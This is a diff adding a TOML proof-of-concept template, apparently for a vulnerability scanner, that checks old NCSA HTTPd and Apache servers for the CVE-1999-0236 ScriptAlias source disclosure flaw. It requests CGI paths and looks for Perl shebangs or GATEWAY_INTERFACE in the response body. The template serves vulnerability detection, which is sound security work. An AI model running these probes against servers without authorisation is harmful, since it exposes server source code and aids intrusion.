@@ -1,0 +1,57 @@
+[info]
+author = "ave"
+description = "检测 NCSA HTTPd 1.3/1.4.x/1.5 及 Apache httpd 0.8.11/0.8.14 ScriptAlias 目录源码泄露漏洞。通过直接请求 ScriptAlias 目录下的 CGI 脚本，检查响应是否包含脚本源代码，确认源码泄露风险。"
+id = "POC-AVE-1999-0421"
+name = "NCSA/Apache httpd ScriptAlias Source Retrieval PoC"
+severity = "high"
+tags = ["ave-1999-0421"]
+vuln_id = [
+    "CVE-1999-0236",
+    "AVE-1999-0421",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/test.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "#!/usr/bin/perl",
+    "#!/usr/local/bin/perl",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/printenv"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "#!/usr/bin/perl",
+    "#!/usr/local/bin/perl",
+    "GATEWAY_INTERFACE",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/test.pl"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "#!/usr/bin/perl",
+    "#!/usr/local/bin/perl",
+]
